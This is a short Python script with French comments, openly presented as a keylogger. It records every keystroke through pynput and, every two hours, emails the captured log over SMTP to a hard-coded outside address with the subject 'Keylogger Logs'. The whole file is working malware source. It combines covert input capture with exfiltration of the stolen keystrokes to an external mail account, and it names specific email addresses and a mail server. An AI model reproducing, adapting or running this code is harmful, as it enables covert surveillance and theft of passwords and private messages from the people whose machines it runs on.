import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard
from threading import Timer
import os

# Variables d'environnement pour éviter de stocker les informations sensibles dans le code
smtp_server = "smtp-tsilavina.alwaysdata.net"
smtp_port = 587
username = "tsilavina@alwaysdata.net"  # Remplace par ton adresse email
password = ""  # Remplace par ton mot de passe
sender_email = username
receiver_email = "rakotoarivonyalifera27@gmail.com"
log = ""
interval = 7200  # Intervalle en secondes pour envoyer les logs

# Fonction pour envoyer les logs par email
def send_log():
    global log
    if log:
        try:
            # Création du message
            msg = MIMEMultipart()
            msg["From"] = sender_email
            msg["To"] = receiver_email
            msg["Subject"] = "Keylogger Logs"
            msg.attach(MIMEText(log, "plain"))

            # Envoi de l'email
            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()
                server.login(username, password)
                server.sendmail(sender_email, receiver_email, msg.as_string())
            print("Logs envoyés par email.")
        except Exception as e:
            print(f"Erreur lors de l'envoi de l'email : {e}")

    # Réinitialiser les logs après l'envoi
    log = ""
    schedule_next_send()

# Planifier l'envoi des logs à intervalles réguliers
def schedule_next_send():
    timer = Timer(interval, send_log)
    timer.daemon = True
    timer.start()

# Fonction pour enregistrer les frappes
def on_press(key):
    global log
    try:
        log += str(key.char)  # Ajouter les caractères pressés
    except AttributeError:
        # Si une touche spéciale est pressée (ex : espace, entrée)
        log += f"[{key}]"

# Fonction pour démarrer le keylogger
def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        schedule_next_send()  # Planifie l'envoi des logs
        listener.join()  # Laisser le listener fonctionner en continu

# Lancer le keylogger
if __name__ == "__main__":
    start_keylogger()
